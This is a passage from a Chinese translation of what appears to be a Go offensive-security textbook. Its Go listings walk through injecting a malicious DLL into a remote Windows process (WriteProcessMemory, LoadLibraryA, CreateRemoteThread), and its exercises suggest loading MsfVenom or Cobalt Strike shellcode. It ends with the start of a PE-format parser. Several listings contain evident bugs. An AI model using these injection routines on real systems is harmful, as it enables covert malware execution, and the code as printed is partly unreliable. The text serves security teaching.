
```
        uintptr(i.DLLSize), // SIZE_T nSize

        uintptr(unsafe.Pointer(nBytesWritten))) // SIZE_T

    )

    if writeMem == 0 {

        return errors.Wrap(lastErr, "[!] ERROR: Can't write to process memory.")

    }

    return nil

}
```

列表 12-9: 将 DLL 文件路径写入远程进程内存 (`/ch12/procInjector/winsys/inject.go`)

第一个显著的系统调用函数是 `BytePtrFromString` ①，这是一个便利函数，它消耗一个字符串并返回字节切片的基索引-0 指针位置，我们将其赋值给 `dllPathBytes`。

最后，我们看到了 `unsafe.Pointer` 的作用。`ProcWriteProcessMemory.Call` 的第三个参数在 Windows API 规范中定义为“lpBuffer——指向缓冲区的指针，该缓冲区包含要写入指定进程地址空间的数据”。为了传递接收 Windows 函数中定义的 Go 指针值，我们使用 `unsafe.Pointer` 来绕过类型转换。最后需要说明的一点是，`uintptr` 和 `unsafe.Pointer` ② 是安全的，因为它们都是内联使用的，且没有意将返回值赋值给变量以供后续复用。

# 使用 GetProcessAddress Windows API 查找 LoadLibraryA

`Kernel32.dll` 导出一个函数 `LoadLibraryA()`，它在所有 Windows 版本上可用。微软文档指出，`LoadLibraryA()` 将指定的模块加载到调用进程的地址空间中。指定的模块可能会导致其他模块被加载。在创建执行进程注入所需的远程线程之前，我们需要获取 `LoadLibraryA()` 的内存位置。我们可以通过 `GetProcessAddress()` 函数来实现——它是之前提到的那些辅助函数之一（列表 12-10）。

```go
func GetLoadLibAddress(i *Inject) error {

  var libBytePtr *byte

  libBytePtr, err := syscall.BytePtrFromString("LoadLibraryA") ①

	if err != nil {

		return err

	}

	laddr, _, lastErr := ProcGetProcAddress.Call(

	ModKernel32.Handle(), // hModule

	uintptr(unsafe.Pointer(LibBytePtr))) // LPCSTR LpProcName

	)

	if err == nil {

		return errors.Wrap(err, "[1] ERROR : Can't get process address.")

	}

	i.LoadLibAddr = lladdr

	fmt.Printf("[+] Kernel32.dll memory address: %v\n", unsafe.Pointer(ModKernel32.Handle()))

	fmt.Printf("[+] Loader memory address: %v\n", unsafe.Pointer(i.LoadLibAddr))

	return nil

}
```

列表 12-10: 使用 `GetProcessAddress()` 获取 `LoadLibraryA()` 的内存地址 (`/ch12/procInjector/winsys/inject.go`)

我们使用 `GetProcessAddress()` Windows 函数来识别调用 `Thread` 函数所需的 `LoadLibraryA()` 内存地址。`ProcGetProcAddress.Call()` 取两个参数：第一个是指向 `Kernel32.dll` 的句柄（包含感兴趣的导出函数），第二个是从字面量 "LoadLibraryA" 返回的字节片基指针。

# 使用 CreateRemoteThread 执行恶意 DLL

我们将使用 `CreateRemoteThread()` Windows 函数针对远程进程的内存区域创建一个线程。如果该区域恰好是 `LoadLibraryA()`，我们现在就有办法加载并执行包含恶意 DLL 文件路径的内存区域。查看列表 12-11 中的代码。

```go
func CreateRemoteThread(i *Inject) error {

var thrldId uint32 = 0

var dwCreationFlags uint32 = 0

remoteThread, _, lastErr := CreateRemoteThread.Call(

i.RemoteProcHandle, // HANDLE hProcess

uintptr(nullRef), // LP_SECURITY_ATTRIBUTES lpAttributes

uintptr(nullRef), // SIZE_T dwSize

i.LoadLibAddr, // LPTHREAD_START_ROUTINE lpStartAddress

i.lpaddr, // LPVOID lpParameter

uintptr(dwCreationFlags), // DWORD dwCreationFlags

uintptr(unsafe.Pointer(&remoteThread)), // LPDWORD ThreadId

)

if remoteThread == 0 {

return errors.Wrap(lastErr, "! ERROR : Can't Create Remote Thread.")

}

i.RThread = remoteThread

fmt.Printf("[+] Thread identifier: %v\n", unsafe.Pointer(&thrldId))

fmt.Printf("[+] Thread handle created: %v\n", unsafe.Pointer(i.RThread))

return nil

}
```

列表 12-11: 使用 `CreateRemoteThread` Windows 函数执行进程注入 (`/ch12/procInjector/winsys/inject.go`)

`CreateRemoteThread.Call()` 函数总共接受七个参数，我们在示例中只使用了其中几个。相关的参数是 `RemoteProcHandle`（受害者进程的句柄）、`LoadLibAddr`（线程调用的起始例），以及最后的负载位置内存指针。

# 使用 WaitForSingleObject Windows API 验证注入

我们将使用 `WaitForSingleObject()` Windows 函数识别特定对象何时处于信号状态。这有助于进程注入，因为我们希望等待线程执行以避免提前退出。让我们简单讨论列表 12-12 中的函数定义。

```go
func WaitForSingleObject(i *Inject) error {

var dwMilliseconds uint32 = INFINITE

var dwExitCode uint32

rWaitValue, _lastErr := ProcWaitForSingleObject.Call(

i.RThread, // HANDLE hHandle

uintptr(dwMilliseconds) // DWORD dwMilliseconds

)

if rWaitValue != 0 {

	return errors.Wrap(_lastErr, "[!] ERROR : Error thread state.")

}

success, _lastErr := ProcGetExitCodeThread.Call(

i.RThread, // HANDLE hThread

uintptr(unsafe.Pointer(&dwExitCode)) // LPDWORD lpExitCode

)

if success == 0 {

	return errors.Wrap(_lastErr, "[!] ERROR : Error thread code.")

}

closed, _lastErr := ProcCloseHandle.Call(i.RThread) // HANDLE hObject

if closed == 0 {

	return errors.Wrap(_lastErr, "[!] ERROR : Error closing handle.")

}

return nil

}
```

列表 12-12: 使用 `WaitForSingleObject` 函数确保线程执行成功 (`/ch12/processor/wins/inject.go`)

代码块发生了三个显著事件。首先，`ProcWaitForSingleObject.Call()` 系统调用传递了 12-11 返回的线程句柄。第二个参数传递了 `INFINITE` 等值以关联无限时间。接下来，`ProcGetExitCodeThread.Call()` 判断线程是否成功终止。如果是，`LoadLibraryA` 函数应该已经被调用，我们的 DLL 将被执行。最后，正如我们对任何句柄进行负责清理一样，我们传递了线程句柄使其干净关闭。

# 使用 VirtualFreeEx API 进行清理

我们使用 `VirtualFreeEx()` Windows 函数来释放或提交我们在列表 12-8 中通过 `VirtualAllocEx()` 分配的虚拟内存。清理内存是必要的，考虑到注入到远程进程的代码总体大小（例如整个 DLL），内存区域可能很大。让我们看看这段代码（列表 12-13）。

```go
func VirtualFreeEx(i *Inject) error {

var dwFreeType uint32 = MEM_RELEASE

var size uint32 = 0 // 为了 MEM_RELEASE 所有远程内存，Size 必须为0

rFreeValue, _, lastErr := ProcVirtualFreeEx.Call(

i.RemoteProcHandle, // HANDLE process

i.LPaddr, // LPVOID Address

uintptr(size), SIZE_T Dwsize

uintptr(dwFreeType)) // DWORD dwFreeType

)

if rFreeValue == 0 {

	return errors.Wrap(lastErr, "![1] ERROR : freeing process memory.")

}

	fmt.Println("+ Success: Freed memory region")

return nil

}
```

列表 12-13: 使用 `VirtualFreeEx` Windows 函数释放虚拟内存 (`/ch12/procInjector/winsys/inject.go`)

`ProcVirtualFreeEx.Call()` 取四个参数。第一个是与释放内存的进程相关的远程进程句柄。下一个参数是指向要释放内存位置的指针。

注意，一个名为 `size` 的变量被赋值为 0 值。这是必要的，正如 Windows API 规范中所定义的那，为了将整个内存区域释放回可重新利用的状态。最后，我们传递 `MEM_RELEASE` 操作来完全释放进程内存（以及我们对注入的讨论）。

# 附加练习

与本书的许多其他章节一样，如果你在过程中进行编码和实验，本章将发挥最大的价值。因此，我们通过几个挑战或用以扩展已涵盖思想的可能来为本节结束句号：

- 创建代码注入最重要的方面之一，是维护一个可用的工具链，用于检查和调试进程执行。下载并安装 Process Hacker 和 Process Monitor 工具。然后，使用 Process Hacker 找到 `Kernel32` 和 `LoadLibrary` 的内存地址。顺便，找到进程句柄（handle）并查看完整性级别以及固有权限。现在，将你的代码注入到同一个受害者进程并找到该线程。

- 你可以扩展进程注入示例使其更复杂一些。例如，不要从磁盘文件路径加载有效负载，而是使用 MsfVenom 或 Cobalt Strike 生成 shellcode 并将其直接加载到进程内存中。这将你需要修改 `VirtualAllocEx` 和 `LoadLibrary`。

- 创建一个 DLL 并将所有内容加载到内存中。这与之前的练习类似：异常是你加载的是整个 DLL 而不是 shellcode。使用 Process Monitor 设置路径过滤器、进程过滤器或两者，并观察系统 DLL 的加载顺序。是什么防止了 DLL 排序劫持？

- 你可以使用一个名为 Frida (https://www.frida.re/) 的项目将 Google Chrome V8 JavaScript 引擎注入到受害者进程。它在移动安全从业人员和开发者中都有大量的支持者：你可以用它执行运行时分析、进程内调试和插桩。你还可以在 Windows 等其他操作系统上使用 Frida。创建自己的代码，将 Frida 注入到受害者进程，并使用 Frida 在同一进程中运行 JavaScript。熟悉 Frida 的工作原理需要一些研究，但我们承诺这是非常值得。

# 可移植执行文件

有时我们需要一个载体来交付我们的恶意代码。这可能是一个新创建的执行文件（通过预存代码中的漏洞交付），也可能是系统中已存在的修改过的执行文件，例如。如果我们想修改一个现有的执行文件，我们需要理解 Windows 可移植执行文件（PE）二进制数据格式结构，因为它规定了如何构建执行文件以及执行文件的能力。在本节中，我们将涵盖 PE 数据结构和 Go 的 PE 包，并构建一个 PE 二进制解析器，你可以用它来遍历 PE 二进制的结构。

# 理解 PE 文件格式

首先，让我们讨论 PE 数据结构格式。Windows PE 文件格式是一种通常表示为执行文件、对象代码或 DLL 的数据结构。PE 格式还维护了在操作系统加载 PE 二进制文件期间使用的所有资源引用，包括用于通过序数维护导出函数的导出地址表（EAT）、用于通过名称维护导出函数的导出名称表、导入地址表（IAT）、导入名称表、线程本地存储（thread local storage）和资源管理，等其他结构。你可以在 https://docs.microsoft.com/en-us/windows/win32/debug/pe-format/ 找到 PE 格式规范。图 12-6 显示了

# PE 数据结构：Windows 二进制文件的视觉化表示。

![](img/c6b1f5eba6708bab206a93514c9cb96f_481_0.png)

图 12-6：Windows PE 文件格式

在我们构建 PE 解析器时，将检查这些自上而下的每个部分。

## 编写 PE 解析器

在接后的章节中，我们将编写必要的各个解析器组件，以分析 Windows 二进制执行文件中的每个 PE 部分。例如，我们将使用位于 https://telegram.org 的 Telegram 消息应用程序相关的 PE 格式，因为该应用比经常被滥用的 putty SSH 二进制示例更复杂，并且是以 PE 格式分发的。你可以使用几乎任何 Windows 二进制执行文件，我们鼓励你去研究其他文件。

### 加载 PE 二进制文件和文件 I/O

在列表 12-14 中，我们将开始使用 Go 的 PE 包为 Telegram 二进制文件为进一步的解析做好准备。你可以将编写此解析器时创建的所有代码放在 `main()` 函数中的单个文件中。

```go
import (

	"debug/pe"

	"encoding/binary"

	"fmt"

	"io"

	"log"

	"os"

)

func main() {

	f, err := os.Open("Telegram.exe")

	check(err)

	file, err := pe.NewFile(f)

	check(err)

	defer file.Close()

	file.Close()
```
